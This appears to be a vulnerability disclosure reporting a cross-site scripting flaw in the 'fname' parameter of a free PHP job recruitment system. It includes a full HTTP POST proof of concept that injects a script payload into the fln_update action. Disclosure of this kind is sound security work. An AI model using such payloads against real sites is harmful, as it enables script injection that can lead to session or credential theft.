# job-recruitment-in-php has Cross Site Scripting vulnerability in $fname 

## supplier 
https://code-projects.org/job-recruitment-in-php-css-javascript-and-mysql-free-download/
## Vulnerability file
echo fname parameter in fln_update function

## describe

echo fname parameter, There is a cross-site scripting attack  vulnerability in Job-recruitment system. The parameter that can be controlled is: fname   parameter . A malicious attacker can obtain sensitive information about administrators.

**Code analysis** 



get fname parameter from post, and echo cname in no filtter.

![image-20241226203338707](https://github.com/user-attachments/assets/953a5255-2c06-4356-ab12-099bc5f8ef3a)

## POC

```
POST /_parse/_all_edits.php HTTP/1.1
Host: airecruitmentsystem
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Origin: http://airecruitmentsystem
Connection: close
Referer: http://airecruitmentsystem/_parse/_all_edits.php
Cookie: PHPSESSID=etso55q58ionvmrvpetmaf8urt
Upgrade-Insecure-Requests: 1
Priority: u=0, i

action=fln_update&fname=<script>alert(1);</script>
```

**Result**

![image-20241226014042311](https://github.com/user-attachments/assets/4e99c0fa-aee2-4ae1-84ed-8e5c1c82cd42)